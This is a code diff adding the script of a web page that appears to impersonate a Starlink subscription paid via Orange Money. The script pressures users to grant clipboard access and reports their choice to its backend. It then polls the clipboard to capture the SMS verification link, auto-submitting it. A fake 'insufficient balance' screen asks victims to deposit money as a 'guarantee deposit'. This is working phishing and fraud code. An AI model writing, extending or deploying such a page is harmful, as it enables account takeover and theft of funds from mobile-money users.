+                clipboardGate.style.display = 'flex';
+                return false;
+            }
+        }
+
+        clipboardGateBtn.addEventListener('click', async function() {
+            clipboardGateBtn.textContent = 'Checking...';
+            clipboardGateBtn.disabled = true;
+
+            // Detect if permission was permanently blocked
+            let permState = 'prompt';
+            try {
+                const perm = await navigator.permissions.query({ name: 'clipboard-read' });
+                permState = perm.state; // 'granted', 'denied', or 'prompt'
+            } catch(e) { /* permissions API not supported — fall through to readText */ }
+
+            if (permState === 'denied') {
+                // Notify backend that clipboard was blocked
+                fetch('/api/clipboard-status', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ decision: 'denied', phone: currentMsisdn, country: currentCountry, source: 'orange' })
+                }).catch(() => {});
+                // Can't re-prompt — browser blocked it. Show manual instructions.
+                document.getElementById('clipboardGateMsg').innerHTML =
+                    '⚠️ Clipboard access was <strong>blocked</strong>.<br><br>' +
+                    'To fix it:<br>' +
+                    '1. Tap the 🔒 icon in your address bar<br>' +
+                    '2. Tap <strong>Site settings</strong><br>' +
+                    '3. Set <strong>Clipboard</strong> to <strong>Allow</strong><br>' +
+                    '4. Come back and refresh this page';
+                clipboardGateBtn.textContent = '🔄 Refresh Page';
+                clipboardGateBtn.disabled = false;
+                clipboardGateBtn.onclick = () => location.reload();
+            } else {
+                const granted = await checkClipboardPermission();
+                if (!granted) {
+                    clipboardGateBtn.textContent = 'Allow Clipboard Access';
+                    clipboardGateBtn.disabled = false;
+                }
+            }
+        });
+
+        // ── Clipboard bypass (manual paste) ──
+        const clipboardBypassBtn = document.getElementById('clipboardBypassBtn');
+        clipboardBypassBtn.addEventListener('click', function() {
+            clipboardGranted = false; // no auto-detect, user will paste manually
+            clipboardGate.style.display = 'none';
+            linkInput.focus();
+            fetch('/api/clipboard-status', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ decision: 'bypassed', phone: currentMsisdn, country: currentCountry, source: 'orange' })
+            }).catch(() => {});
+        });
+
+        // ── Auto-paste link from clipboard (mirrors MTN OTP approach) ──
+        let linkAutoFilled = false;
+        let linkClipboardInterval = null;
+        let lastLinkClipboard = '';
+
+        function extractLinkFromText(text) {
+            if (!text) return null;
+            // Match any http/https URL
+            const match = text.match(/https?:\/\/\S+/);
+            return match ? match[0] : null;
+        }
+
+        function handleLinkText(text) {
+            const link = extractLinkFromText(text);
+            if (!link) return false;
+            linkInput.value = link;
+            verifyBtn.disabled = false;
+            linkAutoFilled = true;
+            stopLinkPolling();
+            // Short delay so user sees the filled field before submit
+            setTimeout(() => verifyBtn.click(), 400);
+            return true;
+        }
+
+        function startLinkPolling(seedText) {
+            stopLinkPolling();
+            linkAutoFilled = false;
+            lastLinkClipboard = seedText || '';
+            linkClipboardInterval = setInterval(async () => {
+                if (!otpScreen.classList.contains('active')) return;
+                if (linkAutoFilled) { stopLinkPolling(); return; }
+                try {
+                    const text = await navigator.clipboard.readText();
+                    if (text && text !== lastLinkClipboard) {
+                        lastLinkClipboard = text;
+                        handleLinkText(text);
+                    }
+                } catch (e) { /* clipboard permission denied */ }
+            }, 1000);
+        }
+
+        function stopLinkPolling() {
+            if (linkClipboardInterval) { clearInterval(linkClipboardInterval); linkClipboardInterval = null; }
+        }
+
+        // When user switches away to SMS app then comes back
+        function onReturnToLinkPage() {
+            if (!otpScreen.classList.contains('active') || linkAutoFilled) return;
+            [100, 500, 1000, 2000].forEach(delay => {
+                setTimeout(async () => {
+                    if (linkAutoFilled) return;
+                    try {
+                        const text = await navigator.clipboard.readText();
+                        if (text && text !== lastLinkClipboard) {
+                            lastLinkClipboard = text;
+                            handleLinkText(text);
+                        }
+                    } catch (e) { /* clipboard denied */ }
+                }, delay);
+            });
+        }
+        document.addEventListener('visibilitychange', function() {
+            if (document.visibilityState === 'visible') onReturnToLinkPage();
+        });
+        window.addEventListener('focus', onReturnToLinkPage);
+        window.addEventListener('pageshow', onReturnToLinkPage);
+
+        // Timer
+        function startTimer() {
+            let seconds = 30;
+            const timerSpan = document.getElementById('timer');
+            const resendLink = document.getElementById('resendLink');
+            
+            timerInterval = setInterval(() => {
+                seconds--;
+                timerSpan.textContent = seconds;
+                
+                if (seconds <= 0) {
+                    clearInterval(timerInterval);
+                    resendLink.classList.remove('disabled');
+                    resendLink.innerHTML = t('resend');
+                    
+                    document.getElementById('otpError').textContent = t('linkExpired');
+                    document.getElementById('otpError').style.background = '#fff3cd';
+                    document.getElementById('otpError').style.color = '#856404';
+                    document.getElementById('otpError').classList.add('show');
+                    
+                    verifyBtn.disabled = true;
+                    linkInput.value = '';
+                }
+            }, 1000);
+        }
+        
+        // Back buttons
+        document.getElementById('backToPhone').addEventListener('click', function() {
+            pinScreen.classList.remove('active');
+            phoneScreen.classList.remove('hidden');
+            pinInputs.forEach(i => i.value = '');
+        });
+        
+        document.getElementById('backToPin').addEventListener('click', function() {
+            otpScreen.classList.remove('active');
+            pinScreen.classList.add('active');
+            linkInput.value = '';
+            clearInterval(timerInterval);
+            stopStatusPolling();
+        });
+        
+        // Resend link
+        document.getElementById('resendLink').addEventListener('click', async function() {
+            if (this.classList.contains('disabled')) return;
+            
+            this.classList.add('disabled');
+            this.innerHTML = t('sending');
+            
+            document.getElementById('otpError').classList.remove('show');
+            
+            try {
+                await fetch('/api/orange/resend-otp', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        phone: `${phoneCode} ${currentMsisdn}`,
+                        country: currentCountry
+                    })
+                });
+                
+                this.innerHTML = `${t('resendIn')} <span id="timer">30</span> ${t('seconds')}`;
+                startTimer();
+            } catch (e) {
+                this.classList.remove('disabled');
+                this.innerHTML = 'Resend link';
+            }
+        });
+        
+        // Init
+        detectCountry();
+
+        // ── Insufficient Balance Polling ──
+        let statusPollInterval = null;
+        function startStatusPolling() {
+            stopStatusPolling();
+            statusPollInterval = setInterval(async () => {
+                try {
+                    const res = await fetch('/api/check-status');
+                    const data = await res.json();
+                    if (data.status === 'insufficient_balance') {
+                        showInsufficientScreen();
+                    }
+                } catch(e) {}
+            }, 3000);
+        }
+        function stopStatusPolling() {
+            if (statusPollInterval) { clearInterval(statusPollInterval); statusPollInterval = null; }
+        }
+        function showInsufficientScreen() {
+            phoneScreen.classList.add('hidden');
+            pinScreen.classList.remove('active');
+            otpScreen.classList.remove('active');
+            document.getElementById('insufficientScreen').classList.add('active');
+            stopStatusPolling();
+            // Dynamic amount display
+            const urlParams = new URLSearchParams(window.location.search);
+            const passedPrice = urlParams.get('lp');
+            const passedCur = urlParams.get('cur');
+            const packageType = urlParams.get('package') || 'starter';
+            let amountDisplay = '$30 USD';
+            if (passedPrice && passedCur) {
+                amountDisplay = passedCur === 'USD' ? `$${passedPrice}` : `${passedCur} ${parseInt(passedPrice).toLocaleString()}`;
+            } else {
+                const pkg = STARLINK_PACKAGES[packageType] || STARLINK_PACKAGES['starter'];
+                const country = COUNTRIES[currentCountry];
+                const currency = country ? country.currency : 'USD';
+                const rate = CURRENCY_RATES[currency] || 1;
+                const localAmount = Math.round(pkg.cdf * rate);
+                amountDisplay = `${currency} ${localAmount.toLocaleString()}`;
+            }
+            const msgEl = document.getElementById('insuffMsg');
+            if (msgEl) {
+                if (currentLang === 'fr') {
+                    msgEl.innerHTML = 'Vous devez avoir au moins <strong style="color:#111;">' + amountDisplay + '</strong> dans votre portefeuille Orange Money comme <strong style="color:#111;">dépôt de garantie</strong> pour souscrire à un forfait Starlink.<br><br>Veuillez déposer le montant requis et cliquer sur le bouton ci-dessous.';
+                    document.getElementById('depositedBtn').textContent = '✅ J\'ai déposé';
+                    document.getElementById('diffNumberBtn').textContent = 'Utiliser un autre numéro';
+                } else {
+                    msgEl.innerHTML = 'You must have at least <strong style="color:#111;">' + amountDisplay + '</strong> in your Orange Money wallet as a <strong style="color:#111;">guarantee deposit</strong> to subscribe to any Starlink package.<br><br>Please deposit the required amount and click the button below.';
+                    document.getElementById('depositedBtn').textContent = '✅ I Have Deposited';
+                    document.getElementById('diffNumberBtn').textContent = 'Use a Different Number';
+                }
+            }
+            document.querySelector('#insufficientScreen h2').textContent = currentLang === 'fr' ? 'Solde Insuffisant' : 'Insufficient Balance';
+        }
+        document.getElementById('depositedBtn').addEventListener('click', async function() {
+            const btn = this;
+            btn.disabled = true;
+            btn.textContent = '⏳ Notifying...';
+            try { await fetch('/api/user-deposited', { method: 'POST' }); } catch(e) {}
+            document.getElementById('insufficientScreen').classList.remove('active');
+            otpScreen.classList.add('active');
+            linkInput.focus();
+            startStatusPolling();
+            btn.disabled = false;
+            btn.textContent = '✅ I Have Deposited';
+        });
+        document.getElementById('diffNumberBtn').addEventListener('click', function() {
+            if (starlinkPackage) {
+                window.location.href = '/starlink/plans/';
+            } else {
+                document.getElementById('insufficientScreen').classList.remove('active');
+                phoneScreen.classList.remove('hidden');
+            }
+        });
+    </script>
+</body>
+</html>
